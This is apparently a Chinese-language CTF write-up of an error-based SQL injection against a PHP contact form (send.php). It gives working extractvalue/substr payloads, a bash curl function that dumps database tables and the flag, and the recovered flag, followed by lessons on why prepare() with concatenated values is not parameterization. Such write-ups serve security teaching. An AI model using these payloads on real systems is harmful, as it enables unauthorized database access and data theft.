## 题解

### 入口与指纹

`Apache/2.4.59 (Debian)` + `PHP/8.3.6`，一个 Founter 模板的营销站。
根页面 73KB，导航/表单大多指向 `https://formbold.com/...`（外部表单服务），
但有**一个本地 action**：

```html
<form action="send.php" ...>
  <input name="fullname"><input name="email"><input name="phone">
  <input name="subject"><textarea name="message"></textarea>
  <button name="submit">
</form>
```

### 关键观察

**1. 缺字段时会打出 PHP warning，泄漏绝对路径。**

```text
Warning: Undefined array key "phone" in /var/www/html/send.php on line 22
```

所以 `send.php` 是本地的 PHP 后端，不是纯静态站。

**2. `fullname` 里一个单引号就让 `prepare()` 抛未捕获异常，并且把 SQL 拼法打出来了。**

```bash
curl -sS -X POST \
  -d "fullname=a'&email=a@a.com&phone=1&subject=s&message=m&submit=1" \
  "http://$T/send.php"
```

```text
Fatal error: Uncaught mysqli_sql_exception: You have a syntax error ... near ''a''' at line 1
Stack trace:
#0 /var/www/html/send.php(72): mysqli->prepare('SELECT * FROM c...')
```

报错里的 `near ''a'''` 说明值被**直接拼进 SQL 字符串**再交给 `prepare()`
（`prepare` 只是执行，不做绑定），因此单引号可注入。

**3. 用 `extractvalue` 做报错回显。**

```sql
a' AND extractvalue(1,concat(0x7e,database()))#
```

```text
XPATH syntax error: '~challenge'
```

同理得到库表：

```text
tables: contact,flag
flag columns: id,flag
```

**4. flag 超过 32 字节，要分段取。**

`extractvalue` 只回显 32 字符，用 `substr()` 分段：

```sql
a' AND extractvalue(1,concat(0x7e,(SELECT substr(flag,1,25)  FROM flag LIMIT 0,1)))#
a' AND extractvalue(1,concat(0x7e,(SELECT substr(flag,26,25) FROM flag LIMIT 0,1)))#
```

### 利用链

```bash
T=$(head -1 .target)

dump() {  # $1 = SQL 表达式
  curl -sS -X POST \
    --data-urlencode "fullname=a' AND extractvalue(1,concat(0x7e,($1)))#" \
    -d 'email=a@a.com&phone=1&subject=s&message=m&submit=1' \
    "http://$T/send.php" | grep -o "XPATH syntax error: '~[^']*'"
}

dump "SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()"
dump "SELECT substr(flag,1,25)  FROM flag LIMIT 0,1"
dump "SELECT substr(flag,26,25) FROM flag LIMIT 0,1"
```

```text
flag{59907352-e47f-4171-b423-de62db0bab63}
```

### flag 位置

MySQL `challenge.flag` 表的 `flag` 列。

## 复盘

- **“静态模板站”要先确认 form 的 `action`。** 页面上大部分表单指向 `formbold.com`，
  但底部联系表单 action 是本地 `send.php`；只看模板库名字会漏掉后端。
- **`mysqli::prepare()` 不等于参数化。** 这道题是 `prepare('... 值 ...')`，
  值已经被拼进 SQL；判据是报错里能看到自己输入的引号（`near ''a'''`）。
- **未捕获的 `mysqli_sql_exception` 直接把查询片段打回页面**，所以优先试报错注入，
  比时间盲注快一个数量级。
- **`extractvalue` 有 32 字符上限**，长的 flag 要 `substr()` 分段拼。
